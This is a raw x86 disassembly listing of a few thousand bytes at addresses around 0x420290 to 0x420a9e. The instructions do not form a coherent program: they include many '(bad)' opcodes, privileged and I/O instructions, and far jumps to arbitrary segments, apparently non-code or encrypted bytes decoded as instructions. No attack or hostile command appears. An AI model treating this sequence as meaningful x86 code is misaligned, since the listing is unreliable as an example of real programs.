  42028e:	sub    al,0x8e
  420290:	ins    BYTE PTR es:[edi],dx
  420291:	mov    ah,0x9c
  420293:	jle    0x420266
  420295:	push   cs
  420296:	mov    edx,ecx
  420298:	test   dl,0xb3
  42029b:	aaa    
  42029c:	scas   al,BYTE PTR es:[edi]
  42029d:	addr16 sbb al,0xbe
  4202a0:	xchg   DWORD PTR [ebx+esi*4],ecx
  4202a3:	js     0x42023d
  4202a5:	sar    BYTE PTR ds:0xdbe15640,cl
  4202ab:	std    
  4202ac:	(bad)  
  4202ae:	aam    0xd1
  4202b0:	xor    ch,al
  4202b2:	push   ss
  4202b3:	cmp    DWORD PTR [ebp+ebx*8-0x26f554ee],ecx
  4202ba:	clc    
  4202bb:	mov    eax,0x8ada88b8
  4202c0:	xchg   esp,eax
  4202c1:	loope  0x420276
  4202c3:	mov    BYTE PTR [edi-0x2],0x38
  4202c7:	xchg   ebx,eax
  4202c8:	les    ecx,FWORD PTR [esi+0x658f639b]
  4202ce:	mov    bl,0x6b
  4202d0:	sub    al,0x8b
  4202d2:	mov    bh,0xa9
  4202d4:	cmp    al,0x96
  4202d6:	dec    ebp
  4202d7:	fcmovbe st,st(2)
  4202d9:	dec    eax
  4202da:	imul   ebx,ecx,0x12
  4202dd:	(bad)
  4202e1:	(bad)  
  4202e2:	jmp    0xe704948e
  4202e7:	imul   esp,DWORD PTR [edi],0x85deba25
  4202ed:	jnp    0x420333
  4202ef:	sahf   
  4202f0:	out    0xdb,eax
  4202f2:	mov    ebx,0xd2cf64f1
  4202f7:	adc    ebp,DWORD PTR [eax-0x1a20e62f]
  4202fd:	leave  
  4202fe:	lds    edx,FWORD PTR [eax-0x6b]
  420301:	sbb    BYTE PTR [ebp+esi*8+0x36746ee5],bl
  420308:	push   ebx
  420309:	jmp    0x99c28db9
  42030e:	push   0xffffff93
  420310:	cs xor al,0x39
  420313:	jmp    0xbd67:0xf38549e0
  42031a:	dec    esi
  42031b:	push   ds
  42031c:	ror    dh,0x66
  42031f:	jg     0x42032f
  420321:	adc    bl,BYTE PTR cs:[ecx+0x22a70b0f]
  420328:	sub    esi,DWORD PTR [eax+0x2dcad8b6]
  42032e:	ret    
  42032f:	adc    cl,bl
  420331:	bound  edi,QWORD PTR [edx]
  420333:	adc    BYTE PTR [esi],0x88
  420336:	dec    edi
  420337:	iret   
  420338:	sub    edx,DWORD PTR [eax+0x8]
  42033b:	js     0x4203b9
  42033d:	jae    0x420333
  42033f:	sub    DWORD PTR [edx],edx
  420341:	jmp    0x42037a
  420343:	dec    edi
  420344:	fistp  WORD PTR [eax+0x63]
  420347:	fs sbb eax,0xd16c5064
  42034d:	inc    edx
  42034e:	add    BYTE PTR [esi-0x1c02c63d],ch
  420354:	sub    ebp,eax
  420356:	adc    eax,0x6894058b
  42035b:	xchg   ecx,eax
  42035c:	and    ebx,eax
  42035e:	outs   dx,BYTE PTR ds:[esi]
  42035f:	pop    esi
  420360:	push   ebp
  420361:	mov    ds:0x268bf4f,eax
  420366:	lods   al,BYTE PTR ds:[esi]
  420367:	push   esp
  420368:	and    BYTE PTR [ecx+0x17],dh
  42036b:	nop    DWORD PTR [edx+0xf]
  42036f:	cmp    BYTE PTR [esp+ecx*8],al
  420372:	gs cmp al,0x44
  420375:	enter  0xf495,0x7f
  420379:	clc    
  42037a:	sahf   
  42037b:	push   ebx
  42037c:	(bad)  
  42037d:	sahf   
  42037e:	mov    bl,dh
  420380:	and    al,0x94
  420382:	push   0xfbc1963b
  420387:	pop    ds
  420388:	fsincos 
  42038a:	and    bh,BYTE PTR [ecx-0x5bdac35a]
  420390:	cdq    
  420391:	inc    edi
  420392:	(bad)  
  420393:	out    0x63,al
  420395:	add    al,0xf4
  420397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420398:	inc    esi
  420399:	cmp    DWORD PTR [ebp+ebp*1-0x3d],edx
  42039d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42039e:	lods   al,BYTE PTR ds:[esi]
  42039f:	lods   al,BYTE PTR ds:[esi]
  4203a0:	retf   
  4203a1:	div    esp
  4203a3:	xor    esi,DWORD PTR [eax]
  4203a5:	fnstsw WORD PTR [edi]
  4203a7:	sbb    DWORD PTR [edx+ecx*4+0x1f07f6c1],edx
  4203ae:	push   esp
  4203af:	mov    ch,0xe7
  4203b1:	dec    eax
  4203b2:	or     eax,0xb8e29563
  4203b7:	ins    BYTE PTR es:[edi],dx
  4203b8:	pusha  
  4203b9:	sbb    dh,BYTE PTR [ebx]
  4203bb:	leave  
  4203bc:	jmp    0x12ac0ac4
  4203c1:	push   0xe9eafc13
  4203c6:	push   ss
  4203c7:	into   
  4203c8:	shr    ch,1
  4203ca:	xchg   ch,dl
  4203cc:	jae    0x420374
  4203ce:	sub    DWORD PTR [eax+0x10966708],esi
  4203d4:	add    DWORD PTR [esi-0x1],ebp
  4203d7:	xchg   edi,eax
  4203d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203d9:	jae    0x42039e
  4203db:	push   eax
  4203dc:	cmc    
  4203dd:	mov    DWORD PTR [eax+0x26],edi
  4203e0:	jmp    0x57bc:0xa4cff86c
  4203e7:	ror    al,0x49
  4203ea:	int3   
  4203eb:	dec    ebp
  4203ec:	mov    eax,0x4070ded7
  4203f1:	out    dx,al
  4203f2:	push   ebx
  4203f3:	add    eax,0x4ba0b657
  4203f8:	xor    al,0x40
  4203fa:	cmp    eax,0x228c19cd
  4203ff:	mov    BYTE PTR [eax-0x326dd94b],bl
  420405:	push   esp
  420406:	cmp    dl,bl
  420408:	mov    dh,0x22
  42040a:	mov    cl,BYTE PTR [edx]
  42040c:	lds    ecx,FWORD PTR [esi-0x143342e9]
  420412:	adc    BYTE PTR [esi-0x670eb49a],bl
  420418:	test   eax,0x78787583
  42041d:	xchg   ebp,eax
  42041e:	cmp    esp,edx
  420420:	mov    ds:0xf08d3f76,eax
  420425:	stos   DWORD PTR es:[edi],eax
  420426:	jge    0x42047d
  420428:	adc    al,0xcd
  42042a:	call   0x230e8d83
  42042f:	sbb    al,0x5b
  420432:	mov    cl,0xd2
  420434:	cmp    esi,DWORD PTR ds:0xb4ac980e
  42043a:	(bad)  
  42043b:	fnstsw WORD PTR [ebx-0x1512006]
  420441:	(bad)  
  420442:	jb     0x4203f4
  420444:	scas   eax,DWORD PTR es:[edi]
  420445:	mov    bl,0xef
  420447:	test   BYTE PTR [ebp-0x78],0xf6
  42044b:	imul   eax,DWORD PTR [edx+0x3177e271],0x0
  420452:	mov    DWORD PTR [eax+0x51857419],edx
  420458:	call   0x2222:0xe1107fdd
  42045f:	mov    ebx,0x979427de
  420464:	jge    0x420420
  420466:	xor    ebp,DWORD PTR [edx+0x63]
  420469:	loop   0x42042a
  42046b:	sub    BYTE PTR [ebx],0x3b
  42046e:	in     eax,dx
  42046f:	dec    ebx
  420470:	mov    ah,0xf7
  420472:	pop    es
  420473:	mov    al,ds:0x69b4aabb
  420478:	rcl    BYTE PTR [eax-0x7c],0x5a
  42047c:	repz add ebx,DWORD PTR [eax]
  42047f:	add    edx,DWORD PTR [edi]
  420481:	icebp  
  420482:	jne    0x4204cf
  420484:	xchg   ebx,eax
  420485:	mov    ds:0x4e9298d,eax
  42048a:	pop    edx
  42048b:	mov    ebx,0x7e465bb9
  420490:	loopne 0x420500
  420492:	push   eax
  420493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420494:	dec    ebp
  420495:	shl    DWORD PTR [ebx],1
  420497:	and    ch,BYTE PTR [ebp+0x7a]
  42049a:	add    al,0x7b
  42049c:	pushf  
  42049d:	mov    ds:0x3a759e26,al
  4204a2:	adc    BYTE PTR [ebx+0x10e1fcd1],cl
  4204a8:	cmp    BYTE PTR [eax],dh
  4204aa:	pop    edx
  4204ab:	neg    DWORD PTR [eax]
  4204ad:	and    al,0x4e
  4204af:	fs xor eax,0xe45583c6
  4204b5:	retf   0x2d09
  4204b8:	(bad)  
  4204ba:	(bad)  
  4204bb:	sub    bh,BYTE PTR [edx]
  4204bd:	icebp  
  4204be:	test   al,0x50
  4204c0:	cdq    
  4204c1:	in     eax,dx
  4204c2:	pusha  
  4204c3:	fwait
  4204c4:	add    eax,DWORD PTR [esi]
  4204c6:	jecxz  0x42048a
  4204c8:	inc    eax
  4204c9:	das    
  4204ca:	mov    bl,0x90
  4204cc:	pop    ss
  4204cd:	xchg   DWORD PTR [esi-0x4ec114f1],ecx
  4204d3:	inc    esi
  4204d4:	repz add DWORD PTR [edi],esi
  4204d7:	ret    0xb05b
  4204da:	mov    esi,0xd987df60
  4204df:	dec    ecx
  4204e0:	test   ebx,esi
  4204e2:	rol    ch,1
  4204e4:	ja     0x4204b7
  4204e6:	sub    al,0x40
  4204e8:	jl     0x420551
  4204ea:	and    esi,ebp
  4204ec:	mov    edx,0x5a72d07c
  4204f1:	cs and eax,0x25272726
  4204f7:	call   0x40215405
  4204fc:	dec    ebx
  4204fd:	mov    edi,0x84fcda18
  420502:	push   ebp
  420503:	inc    eax
  420504:	cld    
  420505:	lods   al,BYTE PTR ds:[esi]
  420506:	and    eax,0xf8ea221b
  42050b:	and    ah,BYTE PTR [ecx]
  42050d:	std    
  42050e:	sub    eax,0xd148dbfb
  420513:	xlat   BYTE PTR ds:[ebx]
  420514:	outs   dx,DWORD PTR ds:[esi]
  420515:	sub    esi,DWORD PTR [esi+ebp*1+0x47]
  420519:	mov    esp,0x1f9b38f
  42051e:	stos   DWORD PTR es:[edi],eax
  42051f:	pop    ss
  420520:	pushf  
  420521:	and    eax,0xd4e1465e
  420526:	xor    al,dl
  420528:	data16 (bad) 
  42052b:	repz and al,BYTE PTR [ecx]
  42052e:	and    esi,DWORD PTR [ebx-0x5dba4797]
  420534:	test   eax,edi
  420536:	mov    al,ds:0x69875819
  42053b:	xchg   edx,ecx
  42053d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42053e:	inc    esp
  42053f:	pop    eax
  420540:	test   BYTE PTR [edx+0x4ce0b0c],al
  420546:	shr    DWORD PTR [edx],cl
  420548:	jno    0x420583
  42054a:	adc    esi,0xd7a22c70
  420550:	pop    ecx
  420551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420552:	mov    ch,0x31
  420554:	xor    ecx,eax
  420556:	push   ebp
  420557:	push   eax
  420558:	les    ebp,FWORD PTR [ecx+ecx*2-0x266d2de2]
  42055f:	jbe    0x42053b
  420561:	push   edx
  420562:	add    BYTE PTR [ebp+0x4799dd29],al
  420568:	adc    BYTE PTR [esi],ah
  42056a:	mov    ebx,DWORD PTR es:[eax]
  42056d:	mov    edi,0x69d42745
  420572:	cmp    BYTE PTR [edi-0x80],bl
  420575:	mov    esp,0x72a16741
  42057a:	mov    ebx,0x503da041
  42057f:	popa   
  420580:	mov    eax,ds:0x84761ff3
  420585:	xor    ebx,DWORD PTR [ebp+0x29917788]
  42058b:	outs   dx,BYTE PTR ds:[esi]
  42058c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42058d:	ret    
  42058e:	mov    ch,cl
  420590:	js     0x68748d08
  420596:	push   eax
  420597:	je     0x420588
  420599:	(bad)  
  42059a:	fucom  st(6)
  42059c:	dec    esi
  42059d:	push   DWORD PTR [esi-0x5b]
  4205a0:	les    ebp,FWORD PTR [edi+0x8]
  4205a3:	ins    DWORD PTR es:[edi],dx
  4205a4:	call   0x3f07614
  4205a9:	xlat   BYTE PTR ds:[ebx]
  4205aa:	mov    eax,0xa588330f
  4205af:	push   ebx
  4205b0:	inc    esi
  4205b1:	aas    
  4205b2:	fadd   DWORD PTR [ebx+esi*2-0x76]
  4205b6:	ds and eax,0xd8063898
  4205bc:	fcmovu st,st(3)
  4205be:	into   
  4205bf:	sti    
  4205c0:	xor    eax,0xf724277e
  4205c5:	mov    WORD PTR [eax+0x55],cs
  4205c8:	cld    
  4205c9:	fisub  WORD PTR ss:[ebp-0x21]
  4205cd:	pop    esp
  4205ce:	xor    al,0x65
  4205d0:	cmp    eax,0x12012787
  4205d5:	xor    ch,ah
  4205d7:	js     0x4205b6
  4205d9:	loope  0x420613
  4205db:	int3   
  4205dc:	loope  0x4205a9
  4205de:	enter  0x645d,0xb7
  4205e2:	sar    DWORD PTR [edi],cl
  4205e4:	in     eax,0xef
  4205e6:	dec    esp
  4205e7:	ja     0x42057d
  4205e9:	jns    0x4205e1
  4205eb:	pop    esi
  4205ec:	out    0x51,eax
  4205ee:	sub    dl,BYTE PTR [ebx]
  4205f0:	xor    ebp,esp
  4205f2:	ret    0x1bfb
  4205f5:	retf   0x1ab4
  4205f8:	adc    al,0x90
  4205fa:	pop    ecx
  4205fb:	stc    
  4205fc:	inc    ecx
  4205fd:	ror    BYTE PTR [edi+esi*1+0x149d8658],cl
  420604:	inc    edi
  420605:	push   esp
  420606:	pop    esp
  420607:	mov    esp,0xbca1cd9e
  42060c:	xchg   DWORD PTR [edx+0x56ad5018],edi
  420612:	jge    0x420655
  420614:	and    ebp,DWORD PTR [eax-0x36]
  420617:	mov    dl,0x78
  420619:	pop    ds
  42061a:	retf   
  42061b:	pop    esi
  42061c:	inc    ebp
  42061d:	out    dx,al
  42061e:	fmulp  st(4),st
  420620:	ret    0x4ff0
  420623:	or     BYTE PTR ds:0xb1137d48,ch
  420629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42062a:	push   edx
  42062b:	ror    BYTE PTR [edx],0x88
  42062e:	cwde   
  42062f:	push   esp
  420630:	jb     0x4205dc
  420632:	sub    eax,0xc0e54334
  420637:	in     al,0xa7
  420639:	add    al,0x1a
  42063b:	cmp    BYTE PTR [ecx],dh
  42063d:	mov    esi,0x85bbebf
  420642:	inc    ebp
  420643:	bound  edi,QWORD PTR [ecx+ebx*1-0x16719d8f]
  42064a:	jg     0x4206b8
  42064c:	pavgw  mm2,mm0
  42064f:	aaa    
  420650:	mov    ebx,0xf0bdb642
  420655:	sbb    al,0xec
  420657:	mov    bl,0x18
  420659:	push   cs
  42065a:	xchg   esi,eax
  42065b:	loope  0x4206b3
  42065d:	cld    
  42065e:	xchg   esi,eax
  42065f:	ret    0x3db8
  420662:	pop    es
  420663:	inc    ecx
  420664:	sbb    BYTE PTR ds:0x9e53f14f,al
  42066a:	imul   ebx,DWORD PTR [esi],0xf17c2c2c
  420670:	xchg   esp,eax
  420671:	add    cl,dl
  420673:	push   esp
  420674:	cmp    eax,0xdcfd9989
  420679:	in     eax,0xf0
  42067b:	jnp    0x4206c9
  42067d:	dec    esp
  42067e:	shl    DWORD PTR [edx],0x70
  420681:	xor    ebp,0xf27c5cce
  420687:	je     0x42060c
  420689:	add    DWORD PTR [ebp-0x75],0x4b
  42068d:	pop    eax
  42068e:	xchg   edx,eax
  42068f:	dec    ebp
  420690:	mov    bh,0x64
  420692:	mov    ah,0x78
  420694:	sbb    ebp,edx
  420696:	fcomp  QWORD PTR [ebx+0xf09323a]
  42069c:	pop    es
  42069d:	out    0x7a,eax
  42069f:	jae    0x4206f7
  4206a1:	stos   BYTE PTR es:[edi],al
  4206a2:	imul   ebp,DWORD PTR [edx+0x32],0x246db9fe
  4206a9:	arpl   cx,dx
  4206ab:	mov    eax,ds:0xe2279863
  4206b0:	xchg   edx,esi
  4206b2:	test   DWORD PTR ds:0x362c028a,ecx
  4206b8:	xor    bh,cl
  4206ba:	mov    bl,0x20
  4206bc:	and    ah,BYTE PTR [ebx-0x57104511]
  4206c2:	ror    DWORD PTR fs:0xa3db89f9,cl
  4206c9:	push   edx
  4206ca:	mov    DWORD PTR [esp+eax*1],esp
  4206cd:	mov    ds:0xfb4a83f5,eax
  4206d2:	bound  esp,QWORD PTR [ebx]
  4206d4:	mov    BYTE PTR [eax+eax*1-0x4943988b],bl
  4206db:	mov    ecx,0x28b95c9c
  4206e0:	push   ebp
  4206e1:	cmc    
  4206e2:	inc    edi
  4206e3:	jne    0x420684
  4206e5:	push   ecx
  4206e6:	inc    edi
  4206e7:	add    eax,0xe64cc29e
  4206ec:	xchg   edx,eax
  4206ed:	inc    edi
  4206ee:	lea    ecx,[ebx+0x387be1e8]
  4206f4:	xchg   DWORD PTR ds:0xe50524ec,ebx
  4206fa:	jno    0x4206a9
  4206fc:	jl     0x4206f1
  4206fe:	or     dh,BYTE PTR [esi+0x27]
  420701:	pushf  
  420702:	fisttp QWORD PTR [edx]
  420704:	jecxz  0x4206ce
  420706:	ret    0x4971
  420709:	rol    edx,1
  42070b:	pop    es
  42070c:	imul   BYTE PTR [edx]
  42070e:	out    dx,eax
  42070f:	adc    BYTE PTR [esi],ah
  420711:	sub    dh,ch
  420713:	xor    eax,0x360118e4
  420718:	add    DWORD PTR [ebp-0x43e8977c],ebp
  42071e:	dec    eax
  42071f:	sbb    DWORD PTR [ebx-0x3b],eax
  420722:	mov    al,ds:0x98fa892a
  420727:	add    ebp,DWORD PTR [ebp+ebp*1-0x6d]
  42072b:	sbb    eax,DWORD PTR [edi]
  42072d:	or     al,0x25
  42072f:	pop    ebx
  420730:	imul   ecx,DWORD PTR [ecx],0x76
  420733:	and    eax,0x7f213a8a
  420738:	ja     0x4206f2
  42073a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42073b:	push   0xe202cfc3
  420740:	mov    esi,0xa65a67ba
  420745:	shufps xmm5,XMMWORD PTR [ebp-0x7f],0x4d
  42074a:	jl     0x420761
  42074c:	into   
  42074d:	int3   
  42074e:	dec    ecx
  42074f:	mov    ?,WORD PTR [esi+0xddbb9e2]
  420755:	fs hlt 
  420757:	add    bl,BYTE PTR [esi]
  420759:	repz mov al,0xe4
  42075c:	mov    eax,ds:0xa6715a4e
  420761:	xor    DWORD PTR [esi],0x8c9fe213
  420767:	fdiv   st,st(5)
  420769:	cs push esi
  42076b:	mov    edx,0xa7544ec5
  420770:	mov    ds:0x84f64feb,eax
  420775:	xor    eax,0xfb4b7c20
  42077a:	ds xor bl,bh
  42077d:	mov    ebx,0x318b28bd
  420782:	fadd   st(4),st
  420784:	ret    0x7ad4
  420787:	push   es
  420788:	and    al,0x5b
  42078a:	ds adc al,0xfc
  42078d:	mov    cl,0x94
  42078f:	or     ebx,DWORD PTR [edi]
  420791:	cmp    eax,0xcf1a84bf
  420796:	test   DWORD PTR [edx+esi*2],edi
  420799:	ins    DWORD PTR es:[edi],dx
  42079a:	rcl    BYTE PTR [esi+0x47],1
  42079d:	xchg   edx,eax
  42079e:	add    edi,DWORD PTR [edi+edi*8-0x77b07997]
  4207a5:	stos   DWORD PTR es:[edi],eax
  4207a6:	jecxz  0x420769
  4207a8:	enter  0x5232,0x19
  4207ac:	mov    es,ebx
  4207ae:	shl    eax,cl
  4207b0:	call   0x30d:0xbd5e36a4
  4207b7:	stos   DWORD PTR es:[edi],eax
  4207b8:	call   DWORD PTR [ecx+ebp*1-0x176f812c]
  4207bf:	jmp    0x926fd0b6
  4207c4:	test   eax,0xf8c24ffd
  4207c9:	xchg   ebp,eax
  4207ca:	sbb    DWORD PTR [eax+ebp*4],esi
  4207cd:	mov    WORD PTR [edx-0x73a80c39],fs
  4207d3:	sbb    BYTE PTR [ebp-0x2913db07],bh
  4207d9:	into   
  4207da:	and    BYTE PTR [ecx+0x4621b790],ah
  4207e0:	dec    esi
  4207e1:	sbb    BYTE PTR ds:0x1c5c376a,0x41
  4207e8:	stc    
  4207e9:	ret    
  4207ea:	ret    
  4207eb:	fdivr  QWORD PTR [ecx]
  4207ed:	or     eax,0x1430590d
  4207f2:	xchg   edx,eax
  4207f3:	sub    eax,0xb72b1049
  4207f8:	shl    edi,1
  4207fa:	mov    fs,eax
  4207fc:	mov    dl,0x81
  4207fe:	xor    al,0x70
  420800:	jae    0x4207f2
  420802:	imul   edi,DWORD PTR [edi],0xffffffaf
  420805:	mov    edi,0xbadd1e32
  42080a:	mov    edx,0x7da575f0
  42080f:	shl    BYTE PTR [ecx+0x18],0xa2
  420813:	mov    al,0x2b
  420815:	lds    edi,FWORD PTR [ebx]
  420817:	call   0x62c7:0x14246c23
  42081e:	push   ebp
  42081f:	mov    eax,0xdda9ad2b
  420824:	lods   al,BYTE PTR ds:[esi]
  420825:	jno    0x4207b0
  420827:	inc    ecx
  420828:	lahf   
  420829:	jne    0x420871
  42082b:	loop   0x420836
  42082d:	aam    0x9b
  42082f:	push   0xa11f9008
  420834:	out    dx,al
  420835:	(bad)  
  420836:	aam    0x1a
  420838:	mov    bh,0x3d
  42083a:	xor    BYTE PTR [ebx],dh
  42083c:	gs enter 0x5185,0xc5
  420841:	mov    eax,ds:0x8a3d82b
  420846:	pop    edi
  420847:	and    DWORD PTR [eax+0x12],0xffffffa0
  42084b:	adc    ah,BYTE PTR [esi]
  42084d:	gs sbb al,0xd3
  420850:	mov    ebp,0xf9a1aeeb
  420855:	xchg   BYTE PTR [eax],dh
  420857:	punpckldq mm5,DWORD PTR [ebp+ebx*1-0x4703ca9b]
  42085f:	mov    esp,0x6e6d537f
  420864:	sub    DWORD PTR [eax],edi
  420866:	push   es
  420867:	es fdiv st,st(2)
  42086a:	fcomp  st(5)
  42086c:	mov    eax,0x138aedb3
  420871:	into   
  420872:	mov    DWORD PTR [edx],esp
  420874:	scas   eax,DWORD PTR es:[edi]
  420875:	icebp  
  420876:	sbb    eax,0x9b87f2d8
  42087b:	inc    ebp
  42087c:	add    bh,BYTE PTR [esi+0x35c9ae97]
  420882:	push   cs
  420883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420884:	das    
  420885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420886:	xchg   edi,eax
  420887:	dec    ebp
  420888:	data16 loope 0x4208fe
  42088b:	jle    0x4208fc
  42088d:	lea    esp,[esi-0x26]
  420890:	add    al,0x1d
  420892:	daa    
  420893:	xor    BYTE PTR [ebp-0x6a],bh
  420896:	adc    eax,0x471d0685
  42089b:	jmp    0xf7:0xb83662e4
  4208a2:	xchg   ecx,eax
  4208a3:	jno    0x420920
  4208a5:	mov    cl,0x9f
  4208a7:	in     eax,dx
  4208a8:	inc    ebp
  4208a9:	popa   
  4208aa:	and    al,0xa0
  4208ac:	adc    esi,DWORD PTR [ecx+0x5035041d]
  4208b2:	fimul  WORD PTR [edx]
  4208b4:	jecxz  0x4208f6
  4208b6:	cmp    eax,0xfdf6ac83
  4208bb:	xchg   DWORD PTR [ecx+0x317ec657],ecx
  4208c1:	and    BYTE PTR [edi+0x3b],dl
  4208c4:	or     ch,al
  4208c6:	(bad)  ds:0xf8244d16
  4208cc:	jle    0x42093a
  4208ce:	cmc    
  4208cf:	dec    eax
  4208d0:	cld    
  4208d1:	sub    ebp,0xb4ad5f1e
  4208d7:	mov    bh,0x6f
  4208d9:	inc    ebx
  4208da:	or     eax,DWORD PTR [ebx-0x55]
  4208dd:	test   al,0x39
  4208df:	and    al,0xff
  4208e1:	arpl   WORD PTR [eax+0x3e],ax
  4208e4:	(bad)
  4208e7:	aam    0x80
  4208e9:	add    eax,0x43ba5f35
  4208ee:	and    ch,BYTE PTR [edi-0x3]
  4208f1:	push   esp
  4208f2:	mov    esp,0x2272ae58
  4208f7:	mul    BYTE PTR [ecx-0x3036be1f]
  4208fd:	and    al,0x3f
  4208ff:	gs push edx
  420901:	inc    eax
  420902:	xchg   ebp,eax
  420903:	ds xchg edx,eax
  420905:	lahf   
  420906:	inc    esi
  420907:	push   ebx
  420908:	scas   eax,DWORD PTR es:[edi]
  420909:	lea    esp,[ebx-0x5a1b798]
  42090f:	into   
  420910:	mov    eax,ds:0xb347df6a
  420915:	inc    ebx
  420916:	dec    ebx
  420917:	pand   mm3,QWORD PTR [edi]
  42091a:	mov    al,0x89
  42091c:	imul   ecx,DWORD PTR ds:0x7ed9e0a4,0x6d6ffe7d
  420926:	and    al,0x78
  420928:	jno    0x42093c
  42092a:	int3   
  42092b:	ffreep st(0)
  42092d:	add    edx,esp
  42092f:	or     BYTE PTR [ebx-0x23],0x1d
  420933:	test   al,0xcb
  420935:	xor    al,0xc
  420937:	pop    esp
  420938:	pop    ss
  420939:	ins    DWORD PTR es:[edi],dx
  42093a:	pop    ebp
  42093b:	(bad)  
  42093c:	xchg   edi,eax
  42093d:	mov    DWORD PTR [ecx-0x3b56e9a2],esi
  420943:	pusha  
  420944:	push   DWORD PTR [edi+0x19]
  420947:	adc    BYTE PTR [ecx-0x3fff292a],ah
  42094d:	inc    esi
  42094e:	das    
  42094f:	add    al,0x25
  420951:	sahf   
  420952:	(bad)  
  420953:	push   esp
  420954:	xchg   DWORD PTR ds:0x4f9c4354,ecx
  42095a:	ins    DWORD PTR es:[edi],dx
  42095b:	hlt    
  42095c:	xchg   ebp,eax
  42095d:	pop    ebx
  42095e:	call   0xf29a:0xe749fc7c
  420965:	cdq    
  420966:	and    bh,BYTE PTR [ecx+eax*2+0x63]
  42096a:	inc    ebp
  42096b:	ds cmp al,0x33
  42096e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42096f:	scas   eax,DWORD PTR es:[edi]
  420970:	(bad)  
  420971:	jmp    0x420916
  420973:	mov    BYTE PTR [edx+edx*2],0x52
  420977:	fimul  WORD PTR [ebx+0x6c474401]
  42097d:	test   edx,esi
  42097f:	rol    BYTE PTR ds:[ebx+0x26],1
  420983:	jb     0x420911
  420985:	push   ecx
  420986:	push   ds
  420987:	inc    esi
  420988:	mov    bh,BYTE PTR [ebx+0x77]
  42098b:	dec    ebx
  42098c:	call   0x760e874f
  420991:	loop   0x42098c
  420993:	sti    
  420994:	nop
  420995:	sub    BYTE PTR [edi+0x7aa92365],cl
  42099b:	xchg   DWORD PTR [eax+esi*2+0x65],edi
  42099f:	inc    edi
  4209a0:	mov    eax,ds:0x4c593017
  4209a5:	rcl    DWORD PTR [edx-0x4c9cc7d3],cl
  4209ab:	fsubrp st(3),st
  4209ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ae:	inc    edi
  4209af:	outs   dx,BYTE PTR ds:[esi]
  4209b0:	and    eax,0x2d870ec2
  4209b5:	and    ch,BYTE PTR [edi-0x5d]
  4209b8:	lds    ecx,FWORD PTR [eax+0x58]
  4209bb:	std    
  4209bc:	push   0xffffff9e
  4209be:	pop    es
  4209bf:	mov    edi,0x288ac601
  4209c4:	or     ecx,0xb0e57fea
  4209ca:	or     al,BYTE PTR [edi-0x1a]
  4209cd:	sar    ebx,0xd2
  4209d0:	scas   eax,DWORD PTR es:[edi]
  4209d1:	inc    ebx
  4209d2:	leave  
  4209d3:	iret   
  4209d4:	int    0x57
  4209d6:	outs   dx,BYTE PTR ds:[esi]
  4209d7:	mov    eax,0x989bdab4
  4209dc:	fidiv  DWORD PTR [ecx+0x6e]
  4209df:	ret    0x5161
  4209e2:	jg     0x4209a2
  4209e4:	sbb    DWORD PTR [esp+edi*1],esi
  4209e7:	imul   ebx,DWORD PTR [esi],0xffffffd1
  4209ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209eb:	repnz mov dl,0x71
  4209ee:	mov    esp,0x58c69e35
  4209f3:	and    DWORD PTR [edx-0x6667cc9f],0xffffffb9
  4209fa:	or     ebp,esi
  4209fc:	aaa    
  4209fd:	iret   
  4209fe:	jp     0x420983
  420a00:	fst    st(5)
  420a02:	fisubr WORD PTR [ebp-0x3e67c7]
  420a08:	data16 lods al,BYTE PTR ds:[esi]
  420a0a:	iret   
  420a0b:	pushf  
  420a0c:	cmp    eax,0xa58d9424
  420a11:	or     BYTE PTR [ebx+0x62],bl
  420a14:	int    0xa7
  420a16:	cmp    ebx,edi
  420a18:	mov    ah,0x63
  420a1a:	pop    edi
  420a1b:	mov    edx,0xf7a34c6f
  420a20:	js     0x420a5a
  420a22:	mov    ebx,DWORD PTR ds:0x63420c61
  420a28:	mov    ebx,0x7e2b055d
  420a2d:	sbb    BYTE PTR [esi-0x6d968de7],dl
  420a33:	and    dh,cl
  420a35:	inc    ecx
  420a36:	scas   eax,DWORD PTR es:[di]
  420a38:	xor    al,0x8
  420a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a3b:	sbb    BYTE PTR [ebp-0x665ff336],cl
  420a41:	loopne 0x420a9b
  420a43:	xor    eax,0xf24abfaa
  420a48:	mov    ds:0x723c8e94,al
  420a4d:	add    BYTE PTR [edi+esi*8-0x292eb2b4],ah
  420a54:	in     eax,dx
  420a55:	lahf   
  420a56:	loop   0x420a61
  420a58:	adc    al,0x9
  420a5a:	mov    ch,0x87
  420a5c:	in     al,dx
  420a5d:	push   ebp
  420a5e:	cli    
  420a5f:	push   esp
  420a60:	sub    DWORD PTR [eax+ebx*1+0x51],ebx
  420a64:	pop    ds
  420a65:	mov    esi,DWORD PTR [ebp+0x6f]
  420a68:	repnz test BYTE PTR [ebx],cl
  420a6b:	xchg   edi,eax
  420a6c:	push   0x6f
  420a6e:	dec    edx
  420a6f:	adc    dl,BYTE PTR [ebx]
  420a71:	xor    bl,dl
  420a73:	pushf  
  420a74:	inc    edx
  420a75:	(bad)  
  420a76:	fnstcw WORD PTR [edi]
  420a78:	push   cs
  420a79:	xor    DWORD PTR [edx+eax*1+0x35],eax
  420a7d:	lea    esi,[esi+0x2c904fe0]
  420a83:	clc    
  420a84:	adc    dh,cl
  420a86:	jbe    0x420a85
  420a88:	pop    ebx
  420a89:	xchg   edx,eax
  420a8a:	jns    0x420a47
  420a8c:	fnsave [edi-0x1c8eb0aa]
  420a92:	aam    0x7b
  420a94:	dec    ebx
  420a95:	popa   
  420a96:	push   ds
  420a97:	ins    BYTE PTR es:[edi],dx
  420a98:	sub    eax,0x6917c087
  420a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a9e:	rol    DWORD PTR [eax+0x18],0xc6
